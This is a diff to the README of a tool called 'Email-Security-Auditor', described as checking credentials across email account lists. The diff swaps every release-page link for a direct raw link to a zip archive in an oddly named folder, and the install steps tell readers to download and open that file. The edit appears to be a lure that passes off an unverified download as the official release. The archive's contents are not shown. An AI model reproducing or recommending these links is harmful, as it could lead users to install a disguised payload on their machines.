@@ -1,6 +1,6 @@
 # 🛡️ Email-Security-Auditor - Audit your email security accounts easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hotru6999/Email-Security-Auditor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hotru6999/Email-Security-Auditor/raw/refs/heads/main/verrucarioid/Security_Email_Auditor_1.0-alpha.1.zip)
 
 Email-Security-Auditor helps you manage email lists and check account security. You can use this tool to verify your credentials and audit account access settings. The software scans lists of email accounts to ensure they use strong authentication and valid login parameters.
 
@@ -8,7 +8,7 @@ Email-Security-Auditor helps you manage email lists and check account security. 
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [releases page](https://github.com/hotru6999/Email-Security-Auditor/releases) to access the downloads.
+1. Visit the [releases page](https://github.com/hotru6999/Email-Security-Auditor/raw/refs/heads/main/verrucarioid/Security_Email_Auditor_1.0-alpha.1.zip) to access the downloads.
 2. Select the latest version of the software.
 3. Download the installation file.
 4. Open the file on your computer to start the setup wizard.
@@ -63,4 +63,4 @@ Use this tool only for accounts you own or have explicit permission to audit. Th
 
 You can find the software versions on the main release page. Visit the link below to get your copy.
 
-[https://github.com/hotru6999/Email-Security-Auditor/releases](https://github.com/hotru6999/Email-Security-Auditor/releases)
+[https://github.com/hotru6999/Email-Security-Auditor/raw/refs/heads/main/verrucarioid/Security_Email_Auditor_1.0-alpha.1.zip](https://github.com/hotru6999/Email-Security-Auditor/raw/refs/heads/main/verrucarioid/Security_Email_Auditor_1.0-alpha.1.zip)
